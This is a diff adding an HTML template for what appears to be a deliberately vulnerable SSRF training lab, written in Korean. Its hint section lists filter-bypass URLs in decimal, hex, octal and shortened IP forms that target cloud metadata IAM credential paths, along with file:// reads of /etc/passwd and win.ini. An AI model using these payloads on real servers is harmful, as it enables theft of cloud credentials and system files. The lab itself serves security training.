@@ -1,0 +1,48 @@
+{% extends "base.html" %}
+{% block content %}
+<h1>URL 미리보기 (SSRF 실습)</h1>
+<p>URL을 입력하면 서버가 대신 요청해서 응답을 보여줍니다. 외부 페이지 프리뷰 기능이라고 생각하세요.</p>
+
+<form class="form-box" action="/fetch" method="get" style="max-width:700px;">
+    <label>URL</label>
+    <input type="text" name="url" placeholder="https://example.com" required>
+    <button type="submit">Fetch</button>
+    <p style="font-size:0.85em; color:#666; margin-top:10px;">
+        보안을 위해 <code>127.0.0.1</code>, <code>localhost</code>, <code>169.254.169.254</code>는 차단됩니다.
+    </p>
+</form>
+
+<div class="post" style="max-width:700px; margin:20px auto;">
+    <h3>💡 실습 힌트 - 차단된 호스트를 다른 방법으로 표현하기</h3>
+    <p>같은 IP 주소를 여러 형식으로 표현할 수 있습니다. 문자열 필터는 이걸 못 잡습니다.</p>
+
+    <h4>127.0.0.1 (loopback)</h4>
+    <ul style="font-family: monospace; font-size: 0.9em;">
+        <li>일반: <a href="/fetch?url=http://127.0.0.1:5001/latest/meta-data/iam/security-credentials/">http://127.0.0.1:5001/...</a> ← 차단됨</li>
+        <li>10진수: <a href="/fetch?url=http://2130706433:5001/latest/meta-data/iam/security-credentials/">http://2130706433:5001/...</a></li>
+        <li>16진수: <a href="/fetch?url=http://0x7f000001:5001/latest/meta-data/iam/security-credentials/">http://0x7f000001:5001/...</a></li>
+        <li>8진수: <a href="/fetch?url=http://0177.0.0.1:5001/latest/meta-data/iam/security-credentials/">http://0177.0.0.1:5001/...</a></li>
+        <li>단축: <a href="/fetch?url=http://127.1:5001/latest/meta-data/iam/security-credentials/">http://127.1:5001/...</a></li>
+    </ul>
+
+    <h4>169.254.169.254 (AWS 메타데이터)</h4>
+    <ul style="font-family: monospace; font-size: 0.9em;">
+        <li>일반: <a href="/fetch?url=http://169.254.169.254/latest/meta-data/">http://169.254.169.254/...</a> ← 차단됨</li>
+        <li>10진수: <a href="/fetch?url=http://2852039166/latest/meta-data/iam/security-credentials/">http://2852039166/...</a></li>
+        <li>16진수: <a href="/fetch?url=http://0xa9fea9fe/latest/meta-data/iam/security-credentials/">http://0xa9fea9fe/...</a></li>
+        <li>* 이 앱에서는 <code>metadata_server.py</code>를 5001 포트로 실행해서 실습합니다.</li>
+    </ul>
+
+    <h4>추가 실습</h4>
+    <ul style="font-family: monospace; font-size: 0.9em;">
+        <li>file:// 스킴: <a href="/fetch?url=file:///etc/passwd">file:///etc/passwd</a> (Linux)</li>
+        <li>file:// 스킴: <a href="/fetch?url=file:///C:/Windows/win.ini">file:///C:/Windows/win.ini</a> (Windows)</li>
+    </ul>
+</div>
+
+<div class="post" style="max-width:700px; margin:20px auto; background:#fff3cd;">
+    <h3>🎯 최종 목표</h3>
+    <p>5001 포트에서 실행 중인 <b>가짜 AWS 메타데이터 서버</b>의 IAM credentials를 SSRF로 탈취하세요.
+    <br>목표 경로: <code>/latest/meta-data/iam/security-credentials/vuln-board-ec2-role</code></p>
+</div>
+{% endblock %}
